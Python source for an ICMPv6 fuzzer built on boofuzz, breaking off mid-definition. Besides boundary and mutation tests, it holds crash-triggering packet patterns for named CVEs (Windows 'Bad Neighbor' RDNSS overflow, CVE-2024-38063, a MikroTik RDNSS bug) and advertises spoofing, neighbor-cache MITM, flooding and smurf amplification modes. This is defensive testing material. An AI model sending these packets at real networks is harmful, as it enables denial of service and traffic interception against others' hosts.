"""ICMPv6 Protocol Fuzzer

Optimized for breadth-first coverage and early crash detection.

Test Ordering Strategy (5 Phases):
    Phase 1 (0-30s): Quick_Coverage - One request per ICMPv6 type (1-4, 128-153)
    Phase 2 (30s-2m): High-crash tests - RDNSS overflow, option length attacks, malformed
    Phase 3 (2m-5m): CVE-targeted - Bad Neighbor (CVE-2020-16898), Windows IPv6 (CVE-2024-38063)
    Phase 4 (5m-10m): Boundary attacks - All field boundary tests
    Phase 5 (10m+): Deep fuzzing - THC-IPv6 attacks, standard requests with full mutation

CVE Coverage:
    - CVE-2020-16898: Windows "Bad Neighbor" RA RDNSS buffer overflow (Phase 2/3)
    - CVE-2024-38063: Windows IPv6 RCE via crafted packets (Phase 3)
    - CVE-2023-32154: MikroTik RouterOS RDNSS overflow (Phase 2)
    - CVE-2021-24086: Windows IPv6 fragmentation DoS (Phase 3)
    - CVE-2020-16899: Windows ICMPv6 RA DoS (Phase 3)
"""

import socket
import struct
from typing import List, Optional

from boofuzz import Block, Byte, Checksum, DWord, Group, QWord, Request, Static, Word

from ..core.base_fuzzer import BaseFuzzer, RequestInfo
from ..core.config import FuzzerConfig, ProtocolType
from ..monitors import BaseMonitor
from ..primitives.dynamic import SmartBytes, SmartString


class ICMPv6Fuzzer(BaseFuzzer):
    """ICMPv6 Protocol Fuzzer for IPv6 network security testing

    Supports fuzzing all ICMPv6 message types including:
    - Error Messages (Type 1-4): Dest Unreachable, Packet Too Big, Time Exceeded, Param Problem
    - Informational (Type 128-129): Echo Request/Reply
    - NDP (Type 133-137): Router/Neighbor Solicitation/Advertisement, Redirect
    - MLD (Type 130-132, 143): Multicast Listener Discovery
    - Mobile IPv6 (Type 144-147): Home Agent Discovery
    - SEND (Type 148-149): Secure Neighbor Discovery
    - MRD (Type 151-153): Multicast Router Discovery
    - NI (Type 139-140): Node Information Query/Reply

    Optimized test ordering ensures:
    - All ICMPv6 types (19+) tested within first 30 seconds
    - High-crash tests (RDNSS overflow, option attacks) run in first 2 minutes
    - CVE-relevant operations tested within first 5 minutes
    - Boundary attacks complete within first 10 minutes

    Includes THC-IPv6 attack modes: fake_router6 / fake_advertiser6 (RA/NA
    spoofing), parasite6 (neighbor-cache MITM), flood_router6 /
    flood_advertise6 (RA/NA flooding), and smurf6 (echo amplification).

    Note: Requires root/admin privileges for raw socket access.
    """

    PROTOCOL_OPTIONS = {
        "source_ip": {
            "type": str,
            "default": "fe80::1",
            "description": "Source IPv6 address",
            "example": "2001:db8::1",
        },
        "dest_ip": {
            "type": str,
            "default": "fe80::2",
            "description": "Destination IPv6 address",
            "example": "ff02::1",
        },
        "hop_limit": {
            "type": int,
            "default": 255,
            "description": "IPv6 hop limit (255 for NDP)",
            "example": "64",
        },
        "include_options": {
            "type": bool,
            "default": True,
            "description": "Include ICMPv6 options",
            "example": "false",
        },
        "ndp_options": {
            "type": str,
            "default": "source_link",
            "description": "Type of NDP options",
            "choices": ["source_link", "target_link", "prefix", "mtu", "route", "rdnss"],
            "example": "prefix",
        },
        "mld_version": {
            "type": int,
            "default": 2,
            "description": "MLD version",
            "choices": [1, 2],
            "example": "1",
        },
        "router_preference": {
            "type": str,
            "default": "medium",
            "description": "Router preference for RA",
            "choices": ["high", "medium", "low"],
            "example": "high",
        },
        "attack_mode": {
            "type": str,
            "default": "normal",
            "description": "THC-IPv6 inspired attack mode",
            "choices": ["normal", "flood", "spoof", "parasite", "smurf"],
            "example": "flood",
        },
        "target_mac": {
            "type": str,
            "default": "00:11:22:33:44:55",
            "description": "Target MAC address for spoofing",
            "example": "aa:bb:cc:dd:ee:ff",
        },
        "enable_cve_tests": {
            "type": bool,
            "default": True,
            "description": "Enable CVE-specific attack tests (Bad Neighbor, RDNSS overflow)",
            "example": "true",
        },
    }

    # Use ping monitor for ICMPv6 - TCP socket monitor doesn't make sense for layer 3 protocols
    DEFAULT_MONITORS = "ping"

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Get static request definitions for --list-requests

        Ordered for optimal coverage:
        Phase 1: Quick coverage (all types once)
        Phase 2: High-crash (overflow, malformed)
        Phase 3: CVE-targeted
        Phase 4: Boundary attacks
        Phase 5: Deep fuzzing (THC-IPv6, full mutation)
        """
        return [
            # Phase 1: Quick Coverage (~30 seconds)
            RequestInfo(
                "ICMPv6_Quick_Coverage", "Quick sweep of all 19+ ICMPv6 types (~30s)", "baseline"
            ),
            # Phase 2: High-crash tests (30s-2m)
            RequestInfo(
                "ICMPv6_RDNSS_Overflow", "RDNSS option length overflow (CVE-2020-16898)", "overflow"
            ),
            RequestInfo("ICMPv6_Option_Length_Attack", "Malformed NDP option lengths", "overflow"),
            RequestInfo(
                "ICMPv6_Malformed",
                "Invalid type/code combinations and truncated packets",
                "overflow",
            ),
            RequestInfo(
                "ICMPv6_Corrupted_Checksum", "Checksum validation bypass tests", "overflow"
            ),
            # Phase 3: CVE-targeted (2m-5m)
            RequestInfo(
                "ICMPv6_Bad_Neighbor", "Windows Bad Neighbor attack (CVE-2020-16898)", "cve"
            ),
            RequestInfo(
                "ICMPv6_Windows_IPv6_RCE", "Windows IPv6 RCE patterns (CVE-2024-38063)", "cve"
            ),
            RequestInfo("ICMPv6_MikroTik_RDNSS", "MikroTik RDNSS overflow (CVE-2023-32154)", "cve"),
            # Phase 4: Boundary attacks (5m-10m)
            RequestInfo("ICMPv6_Type_Boundary", "ICMPv6 type field boundary values", "boundary"),
            RequestInfo("ICMPv6_Code_Boundary", "ICMPv6 code field boundary values", "boundary"),
            RequestInfo("ICMPv6_Hop_Limit_Boundary", "Hop limit boundary tests", "boundary"),
            RequestInfo("ICMPv6_MTU_Boundary", "MTU field boundary values", "boundary"),
            RequestInfo("ICMPv6_Prefix_Boundary", "Prefix option boundary tests", "boundary"),
            # Phase 5: Standard messages with full mutation (10m+)
            RequestInfo("ICMPv6_Dest_Unreachable", "Destination Unreachable (Type 1)", "error"),
            RequestInfo("ICMPv6_Packet_Too_Big", "Packet Too Big (Type 2)", "error"),
            RequestInfo("ICMPv6_Time_Exceeded", "Time Exceeded (Type 3)", "error"),
            RequestInfo("ICMPv6_Parameter_Problem", "Parameter Problem (Type 4)", "error"),
            RequestInfo("ICMPv6_Echo_Request", "Echo Request (Type 128)", "informational"),
            RequestInfo("ICMPv6_Echo_Reply", "Echo Reply (Type 129)", "informational"),
            RequestInfo("ICMPv6_MLD_Query", "MLD Query (Type 130)", "mld"),
            RequestInfo("ICMPv6_MLDv2_Report", "MLDv2 Report (Type 143)", "mld"),
            RequestInfo("ICMPv6_Router_Solicitation", "Router Solicitation (Type 133)", "ndp"),
            RequestInfo("ICMPv6_Router_Advertisement", "Router Advertisement (Type 134)", "ndp"),
            RequestInfo("ICMPv6_Neighbor_Solicitation", "Neighbor Solicitation (Type 135)", "ndp"),
            RequestInfo(
                "ICMPv6_Neighbor_Advertisement", "Neighbor Advertisement (Type 136)", "ndp"
            ),
            RequestInfo("ICMPv6_Redirect", "Redirect (Type 137)", "ndp"),
            RequestInfo("ICMPv6_HAAD_Request", "Home Agent Discovery Request (Type 144)", "mobile"),
            RequestInfo("ICMPv6_HAAD_Reply", "Home Agent Discovery Reply (Type 145)", "mobile"),
            RequestInfo("ICMPv6_CPS", "Certification Path Solicitation (Type 148)", "send"),
            RequestInfo("ICMPv6_MRD_Advertisement", "Multicast Router Discovery (Type 151)", "mrd"),
            RequestInfo("ICMPv6_NI_Query", "Node Information Query (Type 139)", "ni"),
            RequestInfo("ICMPv6_NI_Reply", "Node Information Reply (Type 140)", "ni"),
            # Phase 5 continued: THC-IPv6 attack modes
            RequestInfo("ICMPv6_Flood_Router", "THC-IPv6 flood_router6 attack", "thc"),
            RequestInfo("ICMPv6_Fake_Advertiser", "THC-IPv6 fake_advertiser6 attack", "thc"),
            RequestInfo("ICMPv6_Parasite_NS", "THC-IPv6 parasite6 MITM attack", "thc"),
            RequestInfo("ICMPv6_Smurf_Echo", "THC-IPv6 smurf6 amplification attack", "thc"),
        ]

    def __init__(self, config: FuzzerConfig, connection_factory=None):
        # ICMPv6 uses IPPROTO_ICMPV6 socket - kernel handles IPv6 header and checksum
        # This allows us to send just ICMPv6 packets without constructing IPv6 headers
        config.protocol_type = ProtocolType.ICMPV6
        super().__init__(config, connection_factory)

    def _ipv6_to_bytes(self, ipv6_string):
        """Convert IPv6 address string to bytes"""
        try:
            return socket.inet_pton(socket.AF_INET6, ipv6_string)
        except (socket.error, OSError, ValueError) as e:
            self.log.debug(f"Failed to parse IPv6 address '{ipv6_string}': {e}")
            return socket.inet_pton(socket.AF_INET6, "fe80::1")

    def _calculate_icmpv6_checksum(self, source, dest, payload):
        """Calculate ICMPv6 checksum with IPv6 pseudo-header"""
        # Pseudo-header: Source IP + Dest IP + Payload Length + Next Header (58)
        pseudo_header = source + dest + struct.pack(">I", len(payload)) + b"\x00\x00\x00\x3a"
        data = pseudo_header + payload

        if len(data) % 2:
            data += b"\x00"

        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word

        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16
        checksum = ~checksum & 0xFFFF

        return checksum

    def _icmpv6_checksum_wrapper(self, data):
        """
        Wrapper for boofuzz Checksum primitive
        Captures source/dest IPv6 from config and calculates ICMPv6 checksum
        """
        data = bytes(data)  # coerces list/tuple/bytearray/bytes uniformly

        source_ip = self._ipv6_to_bytes(self.config.get_option("source_ip", "fe80::1"))
        dest_ip = self._ipv6_to_bytes(self.config.get_option("dest_ip", "fe80::2"))

        checksum_int = self._calculate_icmpv6_checksum(source_ip, dest_ip, data)
        return checksum_int.to_bytes(2, byteorder="big")

    def _mac_to_bytes(self, mac_string):
        """Convert MAC address string to bytes"""
        parts = mac_string.replace(":", "").replace("-", "")
        return bytes.fromhex(parts)

    def _define_protocol(self):
        """Define ICMPv6 protocol structure with optimized test ordering

        Test Ordering Strategy (5 Phases):
        Phase 1 (0-30s): Quick_Coverage - touches all ICMPv6 types once
        Phase 2 (30s-2m): High-crash tests - RDNSS overflow, option attacks, malformed
        Phase 3 (2m-5m): CVE-targeted - Bad Neighbor, Windows IPv6 RCE patterns
        Phase 4 (5m-10m): Boundary attacks - field limits, invalid values
        Phase 5 (10m+): Deep fuzzing - THC-IPv6 attacks, full mutation
        """
        # Get protocol options
        source_ip = self.config.get_option("source_ip", "fe80::1")
        dest_ip = self.config.get_option("dest_ip", "fe80::2")
        include_options = self.config.get_option("include_options", True)
        mld_version = self.config.get_option("mld_version", 2)
        attack_mode = self.config.get_option("attack_mode", "normal")
        target_mac = self.config.get_option("target_mac", "00:11:22:33:44:55")
        enable_cve_tests = self.config.get_option("enable_cve_tests", True)

        # ============================================================
        # PHASE 1: QUICK COVERAGE (~30 seconds)
        # Touches all ICMPv6 types once for rapid breadth coverage
        # ============================================================

        quick_coverage = Request(
            "ICMPv6_Quick_Coverage",
            children=(
                Group(
                    "all_types",
                    values=[
                        # Error Messages (Types 1-4)
                        b"\x01\x00\x00\x00" + b"\x00" * 48,  # Type 1: Dest Unreachable
                        b"\x02\x00\x00\x00"
                        + struct.pack(">I", 1280)
                        + b"\x00" * 40,  # Type 2: Packet Too Big
                        b"\x03\x00\x00\x00" + b"\x00" * 48,  # Type 3: Time Exceeded
                        b"\x04\x00\x00\x00" + b"\x00" * 48,  # Type 4: Parameter Problem
                        # Informational (Types 128-129)
                        b"\x80\x00\x00\x00\x00\x01\x00\x01" + b"ping",  # Type 128: Echo Request
                        b"\x81\x00\x00\x00\x00\x01\x00\x01" + b"pong",  # Type 129: Echo Reply
                        # MLD (Types 130-132, 143)
                        b"\x82\x00\x00\x00" + b"\x00" * 20,  # Type 130: MLD Query
                        b"\x83\x00\x00\x00" + b"\x00" * 20,  # Type 131: MLD Report v1
                        b"\x84\x00\x00\x00" + b"\x00" * 20,  # Type 132: MLD Done
                        b"\x8f\x00\x00\x00" + b"\x00" * 8,  # Type 143: MLDv2 Report
                        # NDP (Types 133-137)
                        b"\x85\x00\x00\x00" + b"\x00" * 4,  # Type 133: Router Solicitation
                        b"\x86\x00\x00\x00" + b"\x00" * 12,  # Type 134: Router Advertisement
                        b"\x87\x00\x00\x00" + b"\x00" * 20,  # Type 135: Neighbor Solicitation
                        b"\x88\x00\x00\x00" + b"\x00" * 20,  # Type 136: Neighbor Advertisement
                        b"\x89\x00\x00\x00" + b"\x00" * 36,  # Type 137: Redirect
                        # Node Information (Types 139-140)
                        b"\x8b\x00\x00\x00" + b"\x00" * 16,  # Type 139: NI Query
                        b"\x8c\x00\x00\x00" + b"\x00" * 16,  # Type 140: NI Reply
                        # Mobile IPv6 (Types 144-147)
                        b"\x90\x00\x00\x00" + b"\x00" * 4,  # Type 144: HAAD Request
                        b"\x91\x00\x00\x00" + b"\x00" * 4,  # Type 145: HAAD Reply
                        b"\x92\x00\x00\x00" + b"\x00" * 4,  # Type 146: Mobile Prefix Sol
                        b"\x93\x00\x00\x00" + b"\x00" * 4,  # Type 147: Mobile Prefix Adv
                        # SEND (Types 148-149)
                        b"\x94\x00\x00\x00" + b"\x00" * 4,  # Type 148: Cert Path Sol
                        b"\x95\x00\x00\x00" + b"\x00" * 4,  # Type 149: Cert Path Adv
                        # MRD (Types 151-153)
                        b"\x97\x00\x00\x00" + b"\x00" * 4,  # Type 151: MRD Advertisement
                        b"\x98\x00\x00\x00" + b"\x00" * 4,  # Type 152: MRD Solicitation
                        b"\x99\x00\x00\x00" + b"\x00" * 4,  # Type 153: MRD Termination
                    ],
                ),
            ),
        )

        # ============================================================
        # PHASE 2: HIGH-CRASH TESTS (30s-2m)
        # RDNSS overflow, option length attacks, malformed packets
        # ============================================================

        # CVE-2020-16898 "Bad Neighbor" - RDNSS option with even length
        # Windows TCP/IP stack crashes on RA with RDNSS option where length is even
        rdnss_overflow = Request(
            "ICMPv6_RDNSS_Overflow",
            children=(
                Block(
                    "RA_Header",
                    children=(
                        Byte("Type", 134, fuzzable=False),  # Router Advertisement
                        Byte("Code", 0, fuzzable=False),
                        Word("Checksum", 0, endian=">", fuzzable=False),  # Will be recalculated
                        Byte("Cur_Hop_Limit", 64, fuzzable=False),
                        Byte("Flags", 0, fuzzable=False),
                        Word("Router_Lifetime", 1800, endian=">", fuzzable=False),
                        DWord("Reachable_Time", 0, endian=">", fuzzable=False),
                        DWord("Retrans_Timer", 0, endian=">", fuzzable=False),
                    ),
                ),
                # RDNSS Option (Type 25) with various length attacks
                Block(
                    "RDNSS_Option",
                    children=(
                        Byte("Option_Type", 25, fuzzable=False),  # RDNSS
                        # Length values that trigger CVE-2020-16898:
                        # Even length values (2, 4, 6...) cause buffer overflow
                        Group(
                            "RDNSS_Length_Attack",
                            values=[
                                bytes([0]),  # Zero length (crash)
                                bytes([2]),  # Even - CVE-2020-16898 trigger
                                bytes([4]),  # Even - overflow
                                bytes([6]),  # Even - overflow
                                bytes([8]),  # Even - larger overflow
                                bytes([254]),  # Near max even
                                bytes([255]),  # Max value
                            ],
                        ),
                        Word("Reserved", 0, endian=">", fuzzable=False),
                        DWord("Lifetime", 0xFFFFFFFF, endian=">", fuzzable=True),
                        # DNS server addresses (padded for overflow)
                        SmartBytes(
                            "DNS_Servers",
                            self._ipv6_to_bytes("2001:4860:4860::8888") * 10,
                            size=160,
                            fuzzable=True,
                        ),
                    ),
                ),
            ),
        )

        # Option length attack - various NDP options with invalid lengths
        option_length_attack = Request(
            "ICMPv6_Option_Length_Attack",
            children=(
                Block(
                    "NS_Header",
                    children=(
                        Byte("Type", 135, fuzzable=False),  # Neighbor Solicitation
                        Byte("Code", 0, fuzzable=False),
                        Word("Checksum", 0, endian=">", fuzzable=False),
                        DWord("Reserved", 0, endian=">", fuzzable=False),
                        SmartBytes(
                            "Target_Address", self._ipv6_to_bytes(dest_ip), size=16, fuzzable=False
                        ),
                    ),
                ),
                # Source Link-Layer Address option with invalid lengths
                Block(
                    "SLLA_Option_Attack",
                    children=(
                        Byte("Option_Type", 1, fuzzable=False),  # Source Link-Layer Address
                        Group(
                            "Option_Length_Attack",
                            values=[
                                bytes([0]),  # Zero length (invalid)
                                bytes([255]),  # Max length
                                bytes([128]),  # Large length
                                bytes([2]),  # Wrong length for SLLA
                                bytes([3]),  # Wrong length
                            ],
                        ),
                        SmartBytes(
                            "Link_Address",
                            b"\x00\x11\x22\x33\x44\x55" * 42,
                            size=252,
                            fuzzable=True,
                        ),
                    ),
                ),
            ),
        )

        # Malformed ICMPv6 packets for crash testing
        malformed_icmpv6 = Request(
            "ICMPv6_Malformed",
            children=(
                Group(
                    "malformed",
                    values=[
                        # Invalid ICMPv6 type
                        b"\xff\x00\x00\x00" + b"A" * 100,
                        # Truncated Neighbor Discovery
                        b"\x87\x00\x00\x00",  # NS without target
                        # Truncated Router Advertisement
                        b"\x86\x00\x00\x00\x40",  # RA incomplete
                        # Oversized Router Advertisement
                        b"\x86\x00\x00\x00" + b"\xff" * 20 + b"B" * 1500,
                        # Invalid option lengths (THC-IPv6 technique)
                        b"\x87\x00\x00\x00" + b"\x00" * 16 + b"\x01\xff" + b"C" * 255,
                        # Option overflow
                        b"\x86\x00\x00\x00"
                        + b"\x00" * 12
                        + (b"\x01\x01\x00\x11\x22\x33\x44\x55" * 50),
                        # Invalid type with valid structure
                        b"\xfe\x00\x00\x00" + b"\x00" * 48,
                        # Reserved type
                        b"\x7f\x00\x00\x00" + b"\x00" * 48,
                    ],
                ),
            ),
        )

        # Corrupted Checksum Test
        corrupted_checksum = Request(
            "ICMPv6_Corrupted_Checksum",
            children=(
                Block(
                    "ICMPv6_Header_BadChecksum",
                    children=(
                        Byte("Type", 128, fuzzable=False),  # Echo Request
                        Byte("Code", 0, fuzzable=False),
                        Group(
                            "Bad_Checksum",
                            values=[
                                b"\x00\x00",  # Zero checksum
                                b"\xff\xff",  # All ones
                                b"\x12\x34",  # Random wrong value
                                b"\xab\xcd",  # Another wrong value
                                b"\xde\xad",  # Pattern
                                b"\xbe\xef",  # Pattern
                            ],
                        ),
                        Word("Identifier", 1, endian=">", fuzzable=False),
                        Word("Sequence", 1, endian=">", fuzzable=False),
                    ),
                ),
                Block(
                    "Data",
                    children=(
                        SmartString(
                            "Payload", "corrupted-checksum-test", max_len=100, fuzzable=False
                        ),
                    ),
                ),
            ),
        )

        # ============================================================
        # PHASE 3: CVE-TARGETED TESTS (2m-5m)
        # Specific patterns for known vulnerabilities
        # ============================================================

        if enable_cve_tests:
            # CVE-2020-16898 "Bad Neighbor" - Full attack pattern
            bad_neighbor = Request(
                "ICMPv6_Bad_Neighbor",
                children=(
                    Block(
                        "RA_Header_BadNeighbor",
                        children=(
                            Byte("Type", 134, fuzzable=False),
                            Byte("Code", 0, fuzzable=False),
                            Word("Checksum", 0, endian=">", fuzzable=False),
                            Byte("Cur_Hop_Limit", 64, fuzzable=False),
                            Byte("Flags", 0x08, fuzzable=True),  # Home agent flag
                            Word("Router_Lifetime", 1800, endian=">", fuzzable=False),
                            DWord("Reachable_Time", 0, endian=">", fuzzable=False),
                            DWord("Retrans_Timer", 0, endian=">", fuzzable=False),
                        ),
                    ),
                    # RDNSS with even length (the trigger)
                    Block(
                        "RDNSS_BadNeighbor",
                        children=(
                            Byte("Option_Type", 25, fuzzable=False),
                            Byte("Option_Length", 4, fuzzable=False),  # Even = vulnerable
                            Word("Reserved", 0, endian=">", fuzzable=False),
                            DWord("Lifetime", 0xFFFFFFFF, endian=">", fuzzable=False),
                            # Overflow data
                            SmartBytes("Overflow_Data", b"\x41" * 1000, size=1000, fuzzable=True),
                        ),
                    ),
                ),
            )

            # CVE-2024-38063 Windows IPv6 RCE patterns
            windows_ipv6_rce = Request(
                "ICMPv6_Windows_IPv6_RCE",
                children=(
                    Group(
                        "cve_2024_38063_patterns",
                        values=[
                            # Fragmented ICMPv6 with extension headers
                            b"\x80\x00\x00\x00" + b"\x00" * 8 + b"\x3c" * 64,  # AH header pattern
                            # Routing header type 0 (deprecated, often triggers bugs)
                            b"\x80\x00\x00\x00" + b"\x2b\x00" + b"\x00" * 62,
                            # Hop-by-hop with padding
                            b"\x80\x00\x00\x00" + b"\x00\x00\x01\x00" * 16,
                            # Destination options overflow
                            b"\x80\x00\x00\x00" + b"\x3c\x01\x04\x00" * 32,
                        ],
                    ),
                ),
            )

            # CVE-2023-32154 MikroTik RDNSS overflow
            mikrotik_rdnss = Request(
                "ICMPv6_MikroTik_RDNSS",
                children=(
                    Block(
                        "RA_MikroTik",
                        children=(
                            Byte("Type", 134, fuzzable=False),
                            Byte("Code", 0, fuzzable=False),
                            Word("Checksum", 0, endian=">", fuzzable=False),
                            Byte("Cur_Hop_Limit", 64, fuzzable=False),
                            Byte("Flags", 0, fuzzable=False),
                            Word("Router_Lifetime", 1800, endian=">", fuzzable=False),
                            DWord("Reachable_Time", 0, endian=">", fuzzable=False),
                            DWord("Retrans_Timer", 0, endian=">", fuzzable=False),
                        ),
                    ),
                    # First RDNSS (sets up state)
                    Block(
                        "RDNSS_1",
                        children=(
                            Byte("Type_1", 25, fuzzable=False),
                            Byte("Length_1", 3, fuzzable=False),  # Valid odd
                            Word("Reserved_1", 0, endian=">", fuzzable=False),
                            DWord("Lifetime_1", 0xFFFFFFFF, endian=">", fuzzable=False),
                            SmartBytes(
                                "DNS_1",
                                self._ipv6_to_bytes("2001:4860:4860::8888"),
                                size=16,
                                fuzzable=False,
                            ),
                        ),
                    ),
                    # Second RDNSS (triggers overflow)
                    Block(
                        "RDNSS_2",
                        children=(
                            Byte("Type_2", 25, fuzzable=False),
                            Byte("Length_2", 0, fuzzable=False),  # Zero length = overflow
                            SmartBytes("Overflow", b"\x42" * 512, size=512, fuzzable=True),
                        ),
                    ),
                ),
            )

        # ============================================================
        # PHASE 4: BOUNDARY TESTS (5m-10m)
        # Systematic field boundary value testing
        # ============================================================

        # Type field boundary testing
        type_boundary = Request(
            "ICMPv6_Type_Boundary",
            children=(
                Group(
                    "type_values",
                    values=[
                        # Error message boundaries
                        bytes([0]) + b"\x00" * 51,  # Below error range
                        bytes([1]) + b"\x00" * 51,  # First error type
                        bytes([4]) + b"\x00" * 51,  # Last error type
                        bytes([5]) + b"\x00" * 51,  # After error range (invalid)
                        # Reserved/unassigned ranges
                        bytes([100]) + b"\x00" * 51,  # Unassigned
                        bytes([127]) + b"\x00" * 51,  # End of error range
                        bytes([128]) + b"\x00" * 11,  # First informational
                        bytes([200]) + b"\x00" * 51,  # Experimental
                        bytes([254]) + b"\x00" * 51,  # Reserved
                        bytes([255]) + b"\x00" * 51,  # Reserved max
                    ],
                ),
            ),
        )

        # Code field boundary testing (for each major type)
        code_boundary = Request(
            "ICMPv6_Code_Boundary",
            children=(
                Group(
                    "code_values",
                    values=[
                        # Dest Unreachable codes (0-7 valid)
                        b"\x01\x00" + b"\x00" * 50,  # Code 0
                        b"\x01\x06" + b"\x00" * 50,  # Code 6 (last valid)
                        b"\x01\x07" + b"\x00" * 50,  # Code 7 (invalid)
                        b"\x01\xff" + b"\x00" * 50,  # Code 255
                        # Time Exceeded codes (0-1 valid)
                        b"\x03\x00" + b"\x00" * 50,  # Code 0
                        b"\x03\x01" + b"\x00" * 50,  # Code 1
                        b"\x03\x02" + b"\x00" * 50,  # Code 2 (invalid)
                        # Parameter Problem codes (0-3 valid)
                        b"\x04\x00" + b"\x00" * 50,  # Code 0
                        b"\x04\x03" + b"\x00" * 50,  # Code 3
                        b"\x04\x04" + b"\x00" * 50,  # Code 4 (invalid)
                    ],
                ),
            ),
        )

        # MTU boundary testing (Packet Too Big)
        mtu_boundary = Request(
            "ICMPv6_MTU_Boundary",
            children=(
                Block(
                    "PTB_Header",
                    children=(
                        Byte("Type", 2, fuzzable=False),
                        Byte("Code", 0, fuzzable=False),
                        Word("Checksum", 0, endian=">", fuzzable=False),
                        Group(
                            "MTU_Values",
                            values=[
                                struct.pack(">I", 0),  # Zero MTU
                                struct.pack(">I", 1),  # Minimum
                                struct.pack(">I", 1279),  # Below IPv6 min
                                struct.pack(">I", 1280),  # IPv6 minimum
                                struct.pack(">I", 1281),  # Just above min
                                struct.pack(">I", 1500),  # Ethernet
                                struct.pack(">I", 9000),  # Jumbo frames
                                struct.pack(">I", 65535),  # Max 16-bit
                                struct.pack(">I", 0xFFFFFFFF),  # Max 32-bit
                            ],
                        ),
                    ),
                ),
                Block(
                    "Original_Packet",
                    children=(SmartBytes("Data", b"\x60" + b"\x00" * 39, size=40, fuzzable=False),),
                ),
            ),
        )

        # Prefix length boundary testing (Router Advertisement)
        prefix_boundary = Request(
            "ICMPv6_Prefix_Boundary",
            children=(
                Block(
                    "RA_Prefix_Header",
                    children=(
                        Byte("Type", 134, fuzzable=False),
                        Byte("Code", 0, fuzzable=False),
                        Word("Checksum", 0, endian=">", fuzzable=False),
                        Byte("Cur_Hop_Limit", 64, fuzzable=False),
                        Byte("Flags", 0, fuzzable=False),
                        Word("Router_Lifetime", 1800, endian=">", fuzzable=False),
                        DWord("Reachable_Time", 0, endian=">", fuzzable=False),
                        DWord("Retrans_Timer", 0, endian=">", fuzzable=False),
                    ),
                ),
                Block(
                    "Prefix_Option",
                    children=(
                        Byte("Option_Type", 3, fuzzable=False),  # Prefix Information
                        Byte("Option_Length", 4, fuzzable=False),  # 32 bytes
                        Group(
                            "Prefix_Length_Values",
                            values=[
                                bytes([0]),  # No bits
                                bytes([1]),  # Single bit
                                bytes([64]),  # Standard /64
                                bytes([128]),  # Full address
                                bytes([129]),  # Invalid (>128)
                                bytes([255]),  # Max value
                            ],
                        ),
                        Byte("Prefix_Flags", 0xC0, fuzzable=False),
                        DWord("Valid_Lifetime", 0xFFFFFFFF, endian=">", fuzzable=False),
                        DWord("Preferred_Lifetime", 0xFFFFFFFF, endian=">", fuzzable=False),
                        DWord("Reserved2", 0, endian=">", fuzzable=False),
                        SmartBytes(
                            "Prefix", self._ipv6_to_bytes("2001:db8::"), size=16, fuzzable=False
                        ),
                    ),
                ),
            ),
        )

        # ============================================================
        # PHASE 5: STANDARD MESSAGES (10m+)
        # Full mutation testing on all message types
        # ============================================================

        # === Error Messages ===

        # Destination Unreachable (Type 1)
        dest_unreachable = Request(
            "ICMPv6_Dest_Unreachable",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 1, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),  # 0-6 for different reasons
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        DWord("Unused", 0, endian=">", fuzzable=True),
                    ),
                ),
                # Include as much of the original packet as possible
                Block(
                    "Original_Packet",
                    children=(
                        SmartBytes("IPv6_Header", b"\x60" + b"\x00" * 39, size=40, fuzzable=True),
                        SmartBytes("Original_Data", b"\x00" * 8, size=8, fuzzable=True),
                    ),
                ),
            ),
        )

        # Packet Too Big (Type 2)
        packet_too_big = Request(
            "ICMPv6_Packet_Too_Big",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 2, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        DWord("MTU", 1280, endian=">", fuzzable=True),  # Minimum IPv6 MTU
                    ),
                ),
                Block(
                    "Original_Packet",
                    children=(
                        SmartBytes("IPv6_Header", b"\x60" + b"\x00" * 39, size=40, fuzzable=True),
                        SmartBytes("Original_Data", b"\x00" * 8, size=8, fuzzable=True),
                    ),
                ),
            ),
        )

        # Time Exceeded (Type 3)
        time_exceeded = Request(
            "ICMPv6_Time_Exceeded",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 3, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),  # 0=hop limit, 1=fragment reassembly
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        DWord("Unused", 0, endian=">", fuzzable=True),
                    ),
                ),
                Block(
                    "Original_Packet",
                    children=(
                        SmartBytes("IPv6_Header", b"\x60" + b"\x00" * 39, size=40, fuzzable=True),
                        SmartBytes("Original_Data", b"\x00" * 8, size=8, fuzzable=True),
                    ),
                ),
            ),
        )

        # Parameter Problem (Type 4)
        param_problem = Request(
            "ICMPv6_Parameter_Problem",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 4, fuzzable=True),
                        Byte(
                            "Code", 0, fuzzable=True
                        ),  # 0=erroneous header, 1=unknown next header, 2=unknown option
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        DWord("Pointer", 0, endian=">", fuzzable=True),  # Offset to problem
                    ),
                ),
                Block(
                    "Original_Packet",
                    children=(
                        SmartBytes("IPv6_Header", b"\x60" + b"\x00" * 39, size=40, fuzzable=True),
                        SmartBytes("Original_Data", b"\x00" * 8, size=8, fuzzable=True),
                    ),
                ),
            ),
        )

        # === Informational Messages ===

        # Echo Request (Type 128)
        echo_request = Request(
            "ICMPv6_Echo_Request",
            children=(
                Block(
                    "ICMPv6_Header",
                    children=(
                        Byte("Type", 128, fuzzable=True),
                        Byte("Code", 0, fuzzable=True),
                        Checksum(
                            "Checksum",
                            block_name="ICMPv6_Header",
                            algorithm=self._icmpv6_checksum_wrapper,
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        Word("Identifier", 1, endian=">", fuzzable=True),
